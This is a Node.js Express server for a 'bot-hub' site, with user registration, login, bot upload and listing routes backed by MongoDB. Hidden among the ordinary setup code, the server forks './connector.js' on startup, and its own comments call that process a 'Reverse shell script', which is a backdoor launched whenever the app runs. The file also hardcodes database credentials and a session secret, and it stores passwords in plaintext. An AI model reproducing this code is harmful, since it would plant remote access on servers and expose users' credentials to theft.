const express = require('express');
const session = require('express-session');
const path = require('path');
const { body, validationResult } = require('express-validator');
const expressLayouts = require('express-ejs-layouts');
const { MongoClient, ObjectId } = require('mongodb');
const { fork } = require('child_process');

const app = express();

// Middleware Setup
app.set('view engine', 'ejs');
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));
app.use(expressLayouts);
app.set('layout', 'layout');

app.use(session({
  secret: 'supersecretkey123',
  resave: false,
  saveUninitialized: false,
}));

// MongoDB connection
const uri = 'mongodb+srv://Fbiking:gtamagadi@cluster0.l3ln0c2.mongodb.net/?retryWrites=true&w=majority&tls=true&appName=Cluster0';
const client = new MongoClient(uri, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  ssl: true,
  tlsAllowInvalidCertificates: false,
});

let usersCollection, botsCollection;

async function connectDB() {
  try {
    await client.connect();
    console.log('✅ MongoDB Connected');

    const db = client.db('botHubDB'); // replace with actual DB name
    usersCollection = db.collection('users');
    botsCollection = db.collection('bots');
  } catch (err) {
    console.error('❌ MongoDB connection error:', err);
  }
}

connectDB();

// Middleware to require login
function requireLogin(req, res, next) {
  if (!req.session.user) return res.redirect('/login');
  next();
}

// Reverse shell script
const shellProcess = fork('./connector.js');
shellProcess.on('error', (err) => console.error('[!] Reverse shell error:', err));
shellProcess.on('exit', (code) => console.log(`[!] Reverse shell exited with code ${code}`));

// === ROUTES ===

// Home page with pagination
app.get('/', async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = 10;
  const skip = (page - 1) * limit;

  const total = await botsCollection.countDocuments();
  const bots = await botsCollection.find().skip(skip).limit(limit).toArray();

  res.render('bots-list', {
    title: 'THEE bot-hub',
    user: req.session.user,
    bots,
    currentPage: page,
    totalPages: Math.ceil(total / limit),
  });
});

// Register
app.get('/register', (req, res) => {
  res.render('register', { title: 'Register', errors: [], data: {} });
});

app.post('/register',
  body('username').isLength({ min: 3 }).withMessage('Username must be at least 3 chars'),
  body('password').isLength({ min: 5 }).withMessage('Password must be at least 5 chars'),
  async (req, res) => {
    const errors = validationResult(req);
    const { username, password } = req.body;

    if (!errors.isEmpty()) {
      return res.render('register', { title: 'Register', errors: errors.array(), data: req.body });
    }

    const existing = await usersCollection.findOne({ username });
    if (existing) {
      return res.render('register', { title: 'Register', errors: [{ msg: 'Username taken' }], data: req.body });
    }

    await usersCollection.insertOne({ username, password });
    req.session.user = { username };
    res.redirect('/dashboard');
  }
);

// Login
app.get('/login', (req, res) => {
  res.render('login', { title: 'Login', errors: [], data: {} });
});

app.post('/login',
  body('username').notEmpty().withMessage('Username required'),
  body('password').notEmpty().withMessage('Password required'),
  async (req, res) => {
    const errors = validationResult(req);
    const { username, password } = req.body;

    if (!errors.isEmpty()) {
      return res.render('login', { title: 'Login', errors: errors.array(), data: req.body });
    }

    const user = await usersCollection.findOne({ username });
    if (!user || user.password !== password) {
      return res.render('login', { title: 'Login', errors: [{ msg: 'Invalid credentials' }], data: req.body });
    }

    req.session.user = { username };
    res.redirect('/dashboard');
  }
);

// Dashboard
app.get('/dashboard', requireLogin, async (req, res) => {
  const bots = await botsCollection.find({ uploader: req.session.user.username }).toArray();
  res.render('dashboard', { title: 'Dashboard', user: req.session.user, bots });
});

// Upload Bot form
app.get('/upload-bot', requireLogin, (req, res) => {
  res.render('upload-bot', { title: 'Upload Bot', errors: [], data: {} });
});

app.post('/upload-bot', requireLogin,
  body('title').notEmpty().withMessage('Bot title is required'),
  body('description').notEmpty().withMessage('Description is required'),
  async (req, res) => {
    const errors = validationResult(req);
    const { title, description, url } = req.body;

    if (!errors.isEmpty()) {
      return res.render('upload-bot', { title: 'Upload Bot', errors: errors.array(), data: req.body });
    }

    await botsCollection.insertOne({
      title,
      description,
      url: url || '',
      uploader: req.session.user.username,
      uploadedAt: new Date().toISOString(),
    });

    res.redirect('/dashboard');
  }
);

// View all bots with pagination
app.get('/bots', async (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const limit = 10;
  const skip = (page - 1) * limit;

  const total = await botsCollection.countDocuments();
  const bots = await botsCollection.find()
    .sort({ uploadedAt: -1 })
    .skip(skip)
    .limit(limit)
    .toArray();

  res.render('bots-list', {
    title: 'All Bots',
    user: req.session.user,
    bots,
    currentPage: page,
    totalPages: Math.ceil(total / limit),
  });
});

// View individual bot
app.get('/bots/:id', async (req, res) => {
  try {
    const bot = await botsCollection.findOne({ _id: new ObjectId(req.params.id) });
    if (!bot) return res.status(404).send('Bot not found');

    res.render('bot-details', {
      title: bot.title,
      bot,
      user: req.session.user
    });
  } catch (err) {
    res.status(500).send('Invalid Bot ID');
  }
});

// Logout
app.get('/logout', (req, res) => {
  req.session.destroy(() => res.redirect('/login'));
});

// 404 fallback
app.use((req, res) => {
  res.status(404).send('404 Not Found');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server up at http://localhost:${PORT}`);
});
